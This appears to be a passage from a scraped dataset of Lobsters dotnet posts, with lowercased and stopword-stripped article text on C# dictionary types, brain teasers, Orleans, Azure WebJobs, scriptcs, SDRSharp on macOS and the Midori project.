include microsoftbuild version visualstudioreferenceassemblyversion cultureneutral problem project system try load project reference verbatim project file instead evaluating msbuild engine would fixed one msbuild integration improvement proposed invalidprojectfileexception error xbuild engine loading one target file imported several code analysis project vslsettingstargets pretty sure us msbuild property function msbuild feature xbuild support use allownonmodulatedreference metadata reference completely undocumented idea problem might caused handling xbuild one project ca nt opened v extension project added guid name list known project type show useful error message project depend microsoftbuilddll mono working implementation yet also reference msbuild assembly know finished since roslyn much better error recovery much comprehensive support code completion mono c compiler also much better support dealing incremental change modulo private use private everywhere plain ugly find way selecting compiler use either mc mono c compiler roslyn
621,Lobsters,dotnet,"C#, F#, .NET programming",Better dictionary types,http://bugsquash.blogspot.com/2014/03/better-dictionary-types.html,better dictionary type,http header name caseinsensitive datamap datacaseinsensitive newtype ocamlcore map type real world ocaml including comparator type important certain operation work multiple map require comparison function make illegal state unrepresentable,say need call function like int dosomething dictionary string string data know kind data feed function evidently key value dictionary string comparer key key casesensitive caseinsensitive even matter function example dosomething processing http header would need receive caseinsensitive dictionary http header name caseinsensitive yet type enforce even give u hint typed language deal let take look haskell first haskell datamap requires key type instance ord typeclass since one typeclass instance per type possible ambiguity key compared property one instance per typeclass per type called coherence good property typeclass system keep thing simple programmer compiler wanted caseinsensitive map use datacaseinsensitive concrete map type would reflect caseinsensitive behavior eg import qualified datamap import qualified datacaseinsensitive ci mk main let mfromlist cimk one print mlookup cimk one type map ci string integer confuse casesensitive map string integer compiler simply let different type net typeclasses could achieve something similar case could redesign systemcollectionsgenericdictionary remove constructor admit instance iequalitycomparer tkey mean would always use default comparer key type wanted caseinsensitive dictionary wrap string key type implementing caseinsensitive equality eg sealed class caseinsensitivestring public readonly string value public caseinsensitivestring string value value value public override bool equal object obj referenceequals null obj return false referenceequals obj return true objgettype gettype return false return stringcomparerinvariantcultureignorecaseequals value caseinsensitivestring obj value public override int gethashcode return value null stringcomparerinvariantcultureignorecasegethashcode value public override string tostring return value public static implicit operator caseinsensitivestring string return new caseinsensitivestring var data new dictionary caseinsensitivestring string one consolewriteline data one since dictionary constructor allow overriding equality comparer enough word type dictionary caseinsensitivestring string guarantee dictionary caseinsensitive easily work around creating new type limit dictionary constructor sealed class tkey tvalue dictionary tkey tvalue public public int capacity base capacity public idictionary tkey tvalue dictionary base dictionary guarantee caseinsensitivestring string key equality defined caseinsensitivestring thus caseinsensitive one downside solution need wrap key want different comparer mean allocation le performance haskell avoid penalty making wrapper newtype particular case datacaseinsensitive though net better main problem type uniquely determine equality comparer make part key type make comparer part dictionary type precisely ocamlcore map type determined type map key value comparison function used order key book real world ocaml explains including comparator type important certain operation work multiple map require comparison function seen systemcollectionsgenericdictionary enforce following design principle instead forbidding constructor accept equality comparer opposite forbid constructor take comparer thus making always explicit include comparer additional type parameter sealed class dictionary tkey tvalue tequalitycomparer dictionary tkey tvalue tequalitycomparer iequalitycomparer tkey public dictionary tequalitycomparer comparer base comparer public dictionary int capacity tequalitycomparer comparer base capacity comparer public dictionary idictionary tkey tvalue dictionary tequalitycomparer comparer base dictionary comparer small helper aid type inference c static class dict tkey tvalue public static dictionary tkey tvalue tequalitycomparer create tequalitycomparer tequalitycomparer comparer tequalitycomparer iequalitycomparer tkey return new dictionary tkey tvalue tequalitycomparer comparer another small helper class ease definition comparer type based one already class delegatingequalitycomparer iequalitycomparer private readonly iequalitycomparer comparer public delegatingequalitycomparer iequalitycomparer comparer thiscomparer comparer public bool equal x return comparerequals x public int gethashcode obj return comparergethashcode obj easily create new comparer type like sealed class stringcomparerinvariantcultureignorecase delegatingequalitycomparer string private stringcomparerinvariantcultureignorecase base stringcomparerinvariantcultureignorecase public static readonly stringcomparerinvariantcultureignorecase instance new stringcomparerinvariantcultureignorecase finally use new dictionary type like var data dict string string create stringcomparerinvariantcultureignorecaseinstance dataadd one consolewriteline data one back original function wanted enforce caseinsensitive dictionary use new dictionary type change signature int dosomething dictionary string string stringcomparerinvariantcultureignorecase data epilogue type terrific tool reason code use correctly throwing around type impure partial language like c f mean using type meaningful way consider type allow allow make illegal state unrepresentable precise type becomes easier reason code invariant enforced type system mean compiler make impossible create invalid program find need inspiration type see typed language especially ocaml haskell type system much powerful net often extract underlying design principle adapt le powerful type system addendum judging comment read around web seems goal post nt clear definitely dictionary concretely thought process recognize flaw type design fix interesting invariant enforced type system dictionary type merely used illustrate process
622,Lobsters,dotnet,"C#, F#, .NET programming",Roslyn C# Compiler Is Open Source,http://roslyn.codeplex.com/,roslyn c compiler open source,,javascript required use codeplex archive
623,Lobsters,dotnet,"C#, F#, .NET programming","Project ""Orleans"" Samples and CTP",https://orleans.codeplex.com/,project orleans sample ctp,,javascript required use codeplex archive
625,Lobsters,dotnet,"C#, F#, .NET programming",C# Brain Teasers (Interactive),http://ahuwanya.net/blog/post/C-Sharp-Brainteasers-Part-2,c brain teaser interactive,one posted previously go explanation explanation explanation explanation explanation explanation explanation explanation explanation explanation explanation explanation explanation explanation explanation explanation explanation codepoints,compiled c brain teaser explore interactively tougher one posted previously limited c feature set keep thing simple try guess answer question hit go evaluate code explanation answer bottom post guess output int consolewrite explanation class declaration class base class base public int field class b base public int field public static implicit operator b source return new field sourcefield anything wrong assignment obj new b four statement compile object oarr new string aarr new b object new int long darr new int explanation guess output struct counter int counter public override string tostring return countertostring counter c new counter consolewriteline c object c object r consolewriteline c consolewriteline r consolewriteline consolewriteline consolewriteline r explanation wrong code class outer static int sfield public class nested public virtual int getfieldvalue return sfield class subclass outernested public override int getfieldvalue return sfield explanation length string string string consolewriteline consolewriteline explanation output ie length array int singledimension int multidimension int jagged new int new int consolewriteline singledimensionlength consolewriteline multidimensionlength consolewriteline jaggedlength explanation class declaration class base protected class c public c consolewriteline basec class base public basec inheritedc new basec c myc new c new class c public c consolewriteline ac class b public b c implicitc new c basec basec new basec outputted new b object created b b new b explanation wrong code class b private static void consolewriteline bm public static void int consolewriteline bm int class e static void consolewriteline em static void int consolewriteline em int class c b public static void main explanation field initializer statement class compile class bool false object b new bool c object int j static int explanation wrong code class generator readonly random rnd public generator ref random randomgenerator getrandomgenerator rnd randomgenerator rnd public void reset ref random randomgenerator getrandomgenerator rnd randomgenerator rnd private void getrandomgenerator random randomgenerator randomgenerator new random explanation wo nt code compile class private int public int p get return set value public int getp return public void setp int thisi explanation wo nt code compile class int item public int params int arr get return item explanation output float number zero try consolewriteline number zero catch dividebyzeroexception consolewriteline division zero explanation output checked context float fmax floatmaxvalue int imax intmaxvalue decimal decmax decimalmaxvalue checked try consolewriteline fmax catch consolewriteline float overflow try consolewriteline imax catch consolewriteline integer overflow try consolewriteline decmax catch consolewriteline decimal overflow unchecked context fmax floatmaxvalue imax intmaxvalue decmax decimalmaxvalue unchecked try consolewriteline fmax catch consolewriteline float overflow try consolewriteline imax catch consolewriteline integer overflow try consolewriteline decmax catch consolewriteline decimal overflow explanation class declaration class b public b public virtual void consolewriteline class c b int f public c f public override void consolewrite f outputted new c object created new c explanation type declaration class myclass private int priva public int pubb public myclass int int b thispriva thispubb b struct mystruct private int priva public int pubb public mystruct int int b thispriva thispubb b outputted myclass new myclass myclass new myclass myclass new myclass mystruct new mystruct mystruct new mystruct mystruct new mystruct consolewriteline consolewriteline consolewriteline consolewriteline explanation explanation output char numeric value expressed character really obj new b assignment legal since implicit conversion exists class b first statement compile string class derives object class qualifies implicit reference conversion second statement compile even though user defined implicit conversion standard implicit reference conversion considered array third statement compile even though derives object class value type partake implicit reference conversion fourth statement compile even though type implicitly convertible long type value type array convert reference type qualify implicit reference conversion output case boxing unboxing turned head tostring method override called struct c automatically boxed object type facilitate call store copy c heap call tostring copy therefore counter field actual struct c never change counter field struct c always regardless many time tostring called object boxed copy struct c object r reference boxed copy tostring called either r boxed copy accessed directly counter incremented thus call otostring rtostring increment referenced counter structure show contrary popular opinion possible even trivial modify boxed value static outersfield private field accessible class nested accessible class subclass scope static member includes nested class excludes subclass nested class output udddddddd escape code used encoding unicode character also referred codepoints systemchar structure store bit value single systemchar unable store unicode character fall within range accommodate character multiple systemchar structure used case string two char used store unicode character string one char store unicode character stringlength return number systemchar structure string number unicode character output length property array return total number element single multidimensional array however return number element first dimension jagged array output basec ac basec basec nested class basec marked protected modifier inherited class derive base similar way protected field inherited except case access basec inherited class derived base inherits access basec also defines nested class called c hide basec basec still accessible within class must referred explicitly basec class derive class access basec ac however important note external access ac point inherited basec new class ac implicitly private visible accessible code within class class b derived class inherits access basec externally visible ac actually basec variable implicitc basec refer object constructed class new class ac access modifier changed protected ie protected new class c code output basec ac ac basec b inherit access true class ac fact since class ac closer class b class basec inheritance hierarchy ac implicitly referred c variable implicitc map object constructed class ac whereas variable basec refer object constructed class basec call main method allowed even though accessible static method enclosing class e call refers inaccessible bm method inherited member c preferred member enclosing class accessible inherited method int call method named signature class c mapped method base class b possible call overload method base class call another overload enclosing class compiler choose call either overload base class preferably overload enclosing class comment bm int method overload static method enclosing class called two statement compile bool c field initializer reference nonstatic field method property field object keyword available current context outside method instance field used initialize instance field keyword unavailable outside method property constructor interestingly field ab initializes brand new object allowed following line compile getrandomgenerator rnd readonly field passed ref except constructor readonly field passed ref parameter except constructor constructor accept ref parameter property compiled get propertyname set propertyname method method getp setp conflict generated property method indexer compiled property named item method named getitem setitem field item conflict generated property name okay params modifier indexer output infinity integral int long short byte uint ulong ushort sbyte char decimal type throw divisionbyzero exception divided zero float double type return special value infinity nan output integer overflow decimal overflow decimal overflow overflow integral int long short byte uint ulong ushort sbyte char type wrap around unchecked context checked context throw overflow exception overflow floating point float double type always wrap around never throw overflow exception context also produce special value infinity nan result overflow decimal type always throw overflow exception context output c constructor called implicitly call base constructor field f assignment b constructor call method virtualinstance method resolve method point called b constructor value field f assigned yet default value zero output false false false true default equal method compare reference reference type ie return true variable refer object value type compare type variable return false type compare value field including private one
626,Lobsters,dotnet,"C#, F#, .NET programming",How to Learn Computer Programming,http://www.jeremymorgan.com/blog/programming/how-to-start-programming-for-free/,learn computer programming,tip getting started get money learn text editor visual studio want build part web development backend server side web development linux stack note advantage using linux stack everything free linux developer community open source fun disadvantage linux stack many large company use microsoft stack fragmentation abandoned project lack documentation sometimes thing work microsoft stack advantage microsoft stack backed large successful company ecosystem big business love solid tool disdvantages microsoft stack backed large successful company expensive dreamspark bizspark web hosting common harder learn aspnet aspnet frontend client side web development general programming development summary,want computer programmer want write software get started awesome hobby profession right away next nothing first wrote article back lot changed since decided start completelylast update getting startedif narrow two thing ultimately determine success get money know software job pay well saying try get best pay possible built skill primary reason want get bother two approach programming want learn write software build blank solve blank maybe someday paid iti want make money becoming software developerthe first one really way go honest developer take intense commitment beyond imagine going many skilled profession reach mastery remain employable decade even rest life software one base knowledge development grows last decade applicable skill much smaller shelf life must study improve craft time take dedication passion money simply providethose get purely money tend get disgruntled fail keep trend new technology burn eventually also constantly compete truly learn text editorwhether html assembler writing plain text way learn understand going program must break development environment start hacking awaywhen learn coding ide integrated development environment many shortcut autocompletes mask really going build thing quickly really know happening itwrite hand watch break fix worth timei even recommend c asp learning visual studio arguably best ide ever created help beginner learned c notepad cscexe experience use visual studio every day beginner would hampered learninguse text editor first learn ide thank laterwhat want build first choice must make approaching development stick choice forever start somewhere category software development start ever one excited web developmentdesktop developmentmobile developmentserver developmentthese broken even always niche category bios programming data processing specialization area going tackle seriespart web developmentok time make another decision basic route go need decide stack going least first linux stackmicrosoft stackthere advantage disadvantage outline herethen must decide web development want focus least firstfrontend web development page design gui stuff seebackend web development database apis behind scene stuffthere reason learn frontend backend linux microsoft stack fact take considerable amount time accomplish best pick one area focus firstbackend server side web developmentlinux stackthe linux stack set technology generally used linux operating system platform though technology run window well generally better supported linux hosting much better tooling debugging linux environmentsnote need run linux development machine write software help give try advantage using linux stackeverything free paying hosting may even tool free many tool use develop also free great getting foot wet programmingthe linux developer community linux o choice many developer passionate development helping others starting find ton activity world lot help onlineit open source project find linux open source meaning dig code really see work make change fix problem share source code freely internet philosophy drastically changed programming made software far betterit fun though microsoft net developer living still use linux time writing arch linux laptop constant tinkerer heart love change tweak everything also love optimize environment peak result squeeze lot performance hardware linuxdisadvantages linux stackmany large company use microsoft stack microsoft net framework robust mature stable platform development also mesh well microsoft product used heavily business world work one company want work primarily microsoft linux skill helpful give yet many large company using linux well mix bothfragmentation downside everyone thing becomes fragmented certain technology mesh well together might standard way using piece software far different othersabandoned project many abandoned project realm people group together work something get bored infighting lack interest community happens software dead something useful good someone may pick fork guarantee remember people working free lack documentation something seems improving day project lack good documentation struggle get thing working people free pay anything really expect support help however sharing everything learn itsometimes thing work find software package work missing key feature since commercial backing may le motivation fix edge case special need may enough demand anyone care opportunity become better developer pitch fix thing add featuresthis includes many platform list mostlythese predominant web language net awesome way language relatively easy learn great resource also offer great framework ready build large scale applicationsmicrosoft stackthe microsoft stack organized ecosystem revolving around microsoft product bad thing explain true ecosystem everything designed work together part consists net frameworkc vbnettypescriptaspnet combination technologiesnote aspnet incorporating language language php python ruby part right majority microsoft web development still revolves around technology language listed aboveadvantages microsoft stackit backed large successful company know microsoft whether love hate pretty successful mean lot resource talent throw stuff recent year huge push get developer realm improvement astoundingit ecosystem many developer argue whether good thing environment interconnected everything designed play well together set standard best practice established way thing find fragmented environmentbig business love backing microsoft solid standard reliable structure attract big business net ecosystem many company like fact rely technology help phone call away also like fact microsoft reputation liable releasing product case test thing thoroughly released wildit solid faster scaleable platform linux world price development faster net application rock solid built correctly thing like strong typing excellent debugging profiling tool picky compiler vast knowledgebase contribute quality software people rely build solid software linux net development push build great code default try harder build sloppy software platformthe tool tool ridiculously good net development visual studio ide unmatched opinion development environment debugging profiling tool help squeeze every bit performance security hobbyist get express version tool freedisdvantages microsoft stackit backed large successful company disadvantage ecosystem built around company surface often time project get adopted enough generate number die quick death thing done company best interest every programmer agrees think microsoft evil popular younger hipper programming crowdsit expensive running microsoft shop lot advantage come cheap dissuade lot smaller company startup using disadvantage rectified little known program student get software free dreamspark startup use bizsparkto get software freeweb hosting common throw rock without hitting linux based web host good asp host much harder find host asp either expensive outdated neglectedit harder grab quick book php slap together website couple day great personal blog recipe site asp lot learn lot finicky lot aggregate thing learn environment much strict need learn well also incorporate lot computer science related thinking building exactly bad thing daunting beginnersso still want keep reading learn aspnetaspnet combination microsoft language technology related web funny enough website aspnet fantastic resource learning rope place go learn morec predominant language net backend programming highly recommend learning vbnet easier learn well suited scaling object oriented programming c f microsoft functional language still beginning stage great solution case typescript microsoft language scaleable enterprise javascriptfrontend client side web developmentanyone say frontend development real programming done day javascript robust complex ever providing solid functionality used plain web page fact frontend development fastest growing arena probably best place go futurehere need know scratch surface comprises frontend development stride made every day many framework developed make frontend development web mobile device powerful evergeneral programming developmentfor general programming development knowledge following site great getting nice foundation software developmentsummaryi hope given enough information getting started computer programming since teenager get paid still seems like fun rewarding challenging field get intoyou might asking earth creating competition asked several time blog general answer simple enough u developer job increasing faster amount people fill see opportunity people better life especially developing country someone interested developer happy help outlet know think comment contact
627,Lobsters,dotnet,"C#, F#, .NET programming",Orleans: a Platform for Cloud Computing (used in Halo 4),http://research.microsoft.com/en-us/projects/orleans/,orleans platform cloud computing used halo,overview framework cloud computing,overview framework cloud computing building interactive service scalable reliable hard interactivity imposes strict constraint availability latency directly impact enduser experience support large number concurrent user session high throughput essential traditional threetier architecture stateless frontends stateless middle tier storage layer limited scalability due latency throughput limit storage layer consulted every request caching layer often added middle tier storage improve performance however cache loses concurrency semantic guarantee underlying storage layer prevent inconsistency caused concurrent update cached item application cache manager implement concurrency control protocol without cache stateless middle tier provide data locality us data shipping paradigm every request data sent storage cache middle tier server processing request advent social graph single request may touch many entity connected dynamically multihop relationship make even challenging satisfy required applicationlevel semantics consistency cache fast response interactive access actor model offer appealing solution challenge relying function shipping paradigm actor allow building stateful middle tier performance benefit cache data locality semantic consistency benefit encapsulated entity via applicationspecific operation addition actor make easy implement horizontal social relation entity middle tier another view distributed system programmability lens objectoriented programming oop paradigm oop intuitive way model complex system marginalized popular serviceoriented architecture soa one still benefit oop implementing service component however system level developer think term looselycoupled partitioned service often match application conceptual object contributed difficulty building distributed system mainstream developer actor model brings oop back system level actor appearing developer much like familiar model interacting object actor platform erlang akka step forward simplifying distributed system programming however still burden developer many distributed system complexity relatively low level provided abstraction system service key challenge developing application code managing lifecycle actor dealing distributed race handling failure recovery actor placing actor thus managing distributed resource build correct solution problem application developer must distributed system expert avoid complexity built orleans programming model runtime raise level actor abstraction orleans target developer distributed system expert although expert customer found attractive actorbased differs existing actorbased platform treating actor virtual entity physical one first orleans actor always exists virtually explicitly created destroyed existence transcends lifetime inmemory instantiation thus transcends lifetime particular server second orleans actor automatically instantiated inmemory instance actor message sent actor cause new instance created available server unused actor instance automatically reclaimed part runtime resource management actor never fails server crash next message sent actor running failed server cause orleans automatically reinstantiate actor another server eliminating need application supervise explicitly recreate failed actor third location actor instance transparent application code greatly simplifies programming fourth orleans automatically create multiple instance stateless actor seamlessly scaling hot actor overall orleans give developer virtual actor space analogous virtual memory allows invoke actor system whether present memory virtualization relies indirection map virtual actor physical instantiation currently running level indirection provides runtime opportunity solve many hard distributed system problem must otherwise addressed developer actor placement load balancing deactivation unused actor actor recovery server failure notoriously difficult get right thus virtual actor approach significantly simplifies programming model allowing runtime balance load recover failure transparently runtime support indirection via distributed directory map actor identity current physical location orleans minimizes runtime cost indirection using local cache map strategy proven efficient typically see cache hit rate well production service orleans used build multiple production service currently running microsoft window azure cloud including backend service popular game enabled u validate scalability reliability production application written using orleans adjust model implementation based feedback also enabled u verify least anecdotally orleans programming model lead significantly increased programmer productivity
629,Lobsters,dotnet,"C#, F#, .NET programming",FAKE - F# Make - A DSL for build tasks,http://fsharp.github.io/FAKE/,fake f make dsl build task,use fake fake built several key design principle,use fake fake built several key design principle
631,Lobsters,dotnet,"C#, F#, .NET programming",C# Pad -- Interactive C# REPL,http://csharppad.com,c pad interactive c repl,systemcollectionsimmutable mathnetnumerics newtonsoftjson nodatime nodatimeserializationjsonnet using,following library referenced system systemcore systemxml systemxmllinq systemnumerics systemcollectionsimmutable mathnetnumerics newtonsoftjson nodatime nodatimeserializationjsonnet following namespaces automatically imported system systemlinq systemcollectionsgeneric systemtext systemthreadingtasks use using directive import namespaces note ensure stability system use type blocked think harmless type blacklisted contact whitelist
632,Lobsters,dotnet,"C#, F#, .NET programming",Running SDRSharp on Mac OS X,http://jasiek.me/2014/02/22/running-sdrsharp-on-mac-os-x.html,running sdrsharp mac o x,gbp dvbt dongle rtlsdr suite gqrx sdrsharp download mono platform install xamarin studio project page install portaudio rtlsdr library macports get sdrsharp source build sdrsharp binary set symbolic link library installed run,important note approach may work modern sdrsharp release click detail back bought one gbp dvbt dongle see good anything turn pretty amazing device ca nt possibly beat price given capability sadly variety software available mac leaf much desired apart rtlsdr suite gqrx program available evening turned attention sdrsharp sdr suite originally targeted window platform written c immediately thought mono would possible run sdrsharp mac given mono runtime mind last time looked mono around folk behind working reimplementing windowsforms nt exactly ready prime time back writeup describes get sdrsharp running mac o x download mono platform install xamarin studio first need download mono runtime equivalent net framework platform window head project page select mac osx two package download install install portaudio rtlsdr library order talk dongle need library rtlsdr expose abstraction layer talk dongle using libusb since native library compiled particular platform case mac o x need build scratch using macports sdrsharp us pinvoke facility talk library question need build right architecture assuming macports installed simply issue following command universal variant important sudo port install portaudio universal sudo port install rtlsdr universal building latter may take least case imagemagick rebuilt among others go figure get sdrsharp source directory choice run following svn co http subversionassemblacomsvnsdrsharptrunk sdrsharp pull latest sdrsharp source repository build sdrsharp binary fire xamarin studio open existing project select sdrsharpsln sdrsharp directory checked change active configuration project active configuration select build build give minute build everything set symbolic link library installed tell mono runtime load native library need least portaudio latter required want use usb dongle ln libportaudiodylib ln librtlsdrdylib run head sdrsharprelease directory run edit eric brombaugh pointed following mono ide suggestion made fine running newer version mac o x still install older version mono monodevelop older version net tool sdr sln file nt recognized back version number sln file editing value header edit increasing performance may try luck precompiling executable mono aotfull oall sdrsharpexe prevent mono runtime executing jit compiler potentially leading increased performance appears help old mac mini ymmv run binary mono sdrsharpexe precompiled code executed automatically edit sdrsharp go closed source author sdrsharp decided close source software okay running old version september get source github instead running svn co following git clone http githubcomcgommelsdrsharp attempted run latest binary mono succeed
633,Lobsters,dotnet,"C#, F#, .NET programming",Introducing Windows Azure WebJobs,http://www.hanselman.com/blog/IntroducingWindowsAzureWebJobs.aspx,introducing window azure webjobs,regular job batch work background azure webjobs scaling command line application azure webjobs yak shaving create webjobs net project written c whatever making webjob command line app window azure webjobs sdk simplebatch note nquant open source library context minimal ceremony maximum result http yoursitescmazurewebsitesnetazurejobs cloudberry explorer related link sponsor combit featurerich report designing list label hosting,currently running web site window azure virtual machine prefer run thing using platform service nt sweat underlying virtual machine mean know run virtual machine put cron job le likely nt want mess vms worker role way run stuff azure first iaa infrastructure service vms cloud application cloud service run anything azuremanaged vm still vm lot choice run worker role background stuff however lot ceremony want run small job either regular basis via trigger looking differently platform service like hotel room fixed daily vms like managing house someone like torch hotel room much next person like azure web site paas deploy done vm invisible site always however yet good solution web site regular job batch work background azure web site support thing called azure webjobs solve problem simply scaling command line application azure webjobs want something simple like resize image either write script small net application thing get complex though want take something simple n time scaling command line app cloud often involves lot yak shaving let say want take function work fine command line run cloud scale public static void squishnewlyuploadedpngs stream input stream output var quantizer new wuquantizer using var bitmap new bitmap input using var quantized quantizerquantizeimage bitmap quantizedsave output imageformatpng webjobs aim make developing running scaling easier built azure website run vm web site typical scenario would great window azure webjobs sdk image processing cpuintensive work queue processing r aggregation file maintenance aggregating cleaning log file longrunning task want run background thread sending email webjobs invoked two different way either triggered continuously running triggered job happen schedule event happens continuous job basically run loop webjobs deployed copying right place filesystem using designated api following file type accepted runnable script used job exe net assembly compiled webjobs sdk cmd bat exe using window cmd sh using bash php using php py using python j using node deploy webjobs portal start stop job delete upload job zip file etc got full control good thing point though azure webjobs scheduled script also create webjobs net project written c whatever making webjob command line app window azure webjobs sdk webjobs effectively take command line c application function turn scalable webjob spoke last year presentation codenamed simplebatch let write simple console app say resize image move cloud resize million job triggered appearance new item azure queue new binary blob showing azure storage note nt use webjobs sdk webjobs feature window azure web site noted earlier webjobs feature enables upload run executable script whether us webjobs sdk framework wanted make web job would losslessly squish pngs upload azure storage new pngs show job automatically run new pngs easy command line app using nquant open source library code add webjobs sdk nuget package prerelease microsoftwindowsazurejobs namespace add blobinput bloboutput attribute start jobhost main using microsoftwindowsazurejobs using nquant using systemdrawing using systemdrawingimaging using systemio namespace class program static void main string args jobhost host new jobhost hostrunandblock public static void squishnewlyuploadedpngs blobinput input name stream input bloboutput output name stream output var quantizer new wuquantizer using var bitmap new bitmap input using var quantized quantizerquantizeimage bitmap quantizedsave output imageformatpng context let step back process second spin jobhost set attribute minimal ceremony maximum result console app processing information azure blob storage without ever referencing azure blob storage api function automatically called new blob case new png show input container storage stream parameter automatically bound like model binding webjobs sdk deploy zip app upload webjobs section existing azure website portal portal setting mine continuous also run detailed schedule need webjob told azure storage account going use azure web site connection string section set two string one azurejobsruntime logging one azurejobsdata accessing connection string look like defaultendpointsprotocolhttps accountnamehanselstorage key came manage access key storage account hanselstorage storage container made two area input output name whatever also process queue etc going back code look parameter attribute using public static void squishnewlyuploadedpngs blobinput input name stream input bloboutput output name stream output string input output pointing specific container storage account actual storage account hanselstorage part connection string let reuse webjobs multiple site changing connection string link get azure web job dashboard right job format url access http yoursitescmazurewebsitesnetazurejobs need enter credential used azure deployment uploaded job see registered function installed azure sdk access storage live within visual studio also try party apps like cloudberry explorer uploaded file called scotthapng input container minute sdk process new blob queue faster blob checked every minute job run either succeed fail app throw exception actually see invocation detail part site successful one see worked squished number input byte number output byte see full output happens webjob within dashboard check log file directly via ftp explore output container azure storage download use nowsquished image used large job whether processing image ocr log file analysis sql server cleanup whatever think azure webjobs preview bug changing documentation update sdk general idea solid think dig related link sponsor big thanks combit sponsoring blog feed week enjoy featurerich report designing discover reporting tool choice thousand developer list label awardwinning component royaltyfree report designer free trial hosting
635,Lobsters,dotnet,"C#, F#, .NET programming",CudaSharp,https://github.com/khyperia/CudaSharp,cudasharp,cudasharp,cudasharp library make c run cudaenabled gpus library complete intended general use tester however welcome c executed gpu like c compiler translates c net cil calling cudasharptranslate method read cil translates llvm ir compiles nvidia ptx use gpu library choice example managedcuda read ptx file execute gpu example usage see cudasharptestunittestscs
636,Lobsters,dotnet,"C#, F#, .NET programming",scriptcs - Write C# scripts in your favorite text editor,http://scriptcs.net/,scriptcs write c script favorite text editor,try scriptcs kata oda getting scriptcs chocolatey installing scriptcs note staying uptodate nightly build myget building source getting started using repl writing script run administrator bootstrap script script pack scriptcswebapi referencing script load directive note referencing assembly r directive contributing sample documentation sample repository wiki community google group jabbr coordinator credit list developer license apache license,scriptcs make easy write execute c simple text editor visual studio ides powerful tool sometimes hinder productivity promote always need want overhead creating new solution project sometimes want type away favorite text editor scriptcs free visual studio without sacrificing advantage stronglytyped language write c favorite text editor use nuget manage dependency relaxed c scripting syntax mean write execute application one line code script pack allow bootstrap environment new script reduces amount code necessary take advantage favorite c framework try scriptcs try scriptcs right browser using kata oda click image get started getting scriptcs release nightly build installed using chocolatey information installing chocolatey available website installing scriptcs chocolatey installed install latest stable version scriptcs command prompt cinst scriptcs chocolatey install scriptcs appdata scriptcs update path accordingly note may need restart command prompt installation completes staying uptodate chocolatey keeping scriptcs updated easy cup scriptcs nightly build nightly build hosted myget also installed chocolatey cinst scriptcs pre source http wwwmygetorgfscriptcsnightly building source execute buildcmd start build script getting started using repl scriptcs repl started running scriptcs without parameter repl allows execute c statement directly command prompt c scriptcs scriptcs ctrlc blank exit var message hello world consolewriteline message hello world c writing script empty directory create new file named appcsx using ravenclient using ravenclientembedded using ravenclientindexes consolewriteline starting ravendb server embeddabledocumentstore documentstore null try documentstore new embeddabledocumentstore useembeddedhttpserver true documentstoreinitialize var url stringformat http localhost documentstoreconfigurationport consolewriteline ravendb started listening url consolereadkey finally documentstore null documentstoredispose scriptcs install ravendbembedded execute script note listening port requires command prompt launched using run administrator option scriptcs appcsx info starting create execution component info starting execution starting ravendb server snip ravendb started listening http navigating url raven listening bring ravendb management studio bootstrap script script pack script pack used reduce amount code need write working common framework empty directory install scriptcswebapi script pack nuget script pack automatically import web api namespaces provides convenient factory method initializing web api host also replaces default controllerresolver custom implementation allows web api discover controller declared script scriptcs install scriptcswebapi script pack imported script calling require tscriptpack create file named servercsx contains following code public class testcontroller apicontroller public string get return hello world var webapi require webapi var server webapicreateserver http serveropenasync wait consolewriteline listening consolereadkey servercloseasync wait command prompt running administrator execute servercsx file browse http see result testcontrollerget method string xmlns http hello world string referencing script move testcontroller class previous example new file named controllercsx following content first line servercsx reference controllercsx using load directive note load directive must placed top script otherwise ignored command prompt running administrator execute servercsx file browse http see result testcontrollerget method string xmlns http hello world string referencing assembly reference additional assembly gac bin folder script directory using r directive r nunitcoredll r nunitcoreinterfacesdll var path unittestsdll var runner testsetupgetrunner new path var result runnerrun new consolelistener msg consolewriteline msg testfilterempty true loggingthresholdall consolereadkey contributing sample documentation additional sample contributed sample repository documentation found wiki community want chat addition twitter find u google group jabbr coordinator credit check list developer responsible getting scriptcs today special thanks filip wojcieszyn inspiration behind roslyn web api post thanks roslyn team helped point right direction license apache license
637,Lobsters,dotnet,"C#, F#, .NET programming",C# for Systems Programming,http://joeduffyblog.com/,c system programming,reached first pulumi favorite thing head pulumi blog professional mma fighter tale three safety midori performance culture midori aheadoftime compiled typesafe language based c first midori post last time ambient authority access control capability,started pulumi little two year ago ambitious mission enable many people planet harness much modern cloud possible raw capability modern cloud platform astonishing growing unbelievable pace yet remain reach hard use u pulumi mission start helping already using cloud operation infrastructure team well developer infrastructure eye empowering growing number million developer industry happy today reached first milestone would love share bit background excited release come next post look pearl bitesized code snippet demonstrate fun way program cloud using pulumi introductory post mentioned favorite thing let dive specific multicloud cloudspecific spanning container serverless infrastructure generally highlighting using real language empowering cloud scenario since pulumi let infrastructureascode lowestlevel highest cover lot interesting ground short order continue reading head pulumi today launched pulumi new open source cloud development platform using pulumi author cloud program using favorite language spanning lowlevel infrastructureascode highly productive modern container serverlesspowered application started pulumi little year ago blown away progress made first step journey huge one eager share built almost unbelievably six month since blogged promise return soon good ever become professional mma fighter tale three safety discussed three kind safety type memory concurrency followon article dive deeper last perhaps novel yet difficult one concurrencysafety led midori project first place spent year net c concurrency model leading joining built great thing proud time perhaps broadly interesting however reflection experience year away project essay talk performance culture performance one key pillar software engineering something hard right sometimes even difficult recognize famous judge said know see spoken length performance culture independently however intersection two thing get interesting team well performance ingrained nearly aspect team operates start able proactively deliver loveable customer experience crush competition easy cookiecutter recipe achieving good performance culture however certainly best practice follow plant requisite seed team let go midori written aheadoftime compiled typesafe language based c aside microkernel whole system written including driver domain kernel user code hinted thing along way time address headon entire language huge space cover take series post first error model way error communicated dealt fundamental language especially one used write reliable operating system like many thing midori whole system approach necessary getting right taking several iteration several year regularly hear old teammate however thing miss programming midori right without ado let start first midori post described safety foundation everything mentioned built operating system safe code yet stayed competitive operating system like window linux written c c many way system architecture played key role continue discussing future post foundation optimizing compiler often eeked native code performance otherwise managed type memorysafe code one important weapon post describe key insight technique essential success midori built many ultralightweight finegrained process connected strongly typed message passing interface common see program classically single monolithic process perhaps internal multithreading expressed instead dozen small process resulting natural safe largely automatic parallelism synchronous blocking flatout disallowed meant literally everything asynchronous file network io message passing synchronization activity like rendezvousing asynchronous work resulting system highly concurrent responsive user input scaled like dickens imagine also came fascinating challenge last time saw midori built foundation type memory concurrency safety time see enabled novel approach security namely let system eliminate ambient authority access control favor capability woven fabric system code many principle guarantee delivered byconstruction via programming language type system
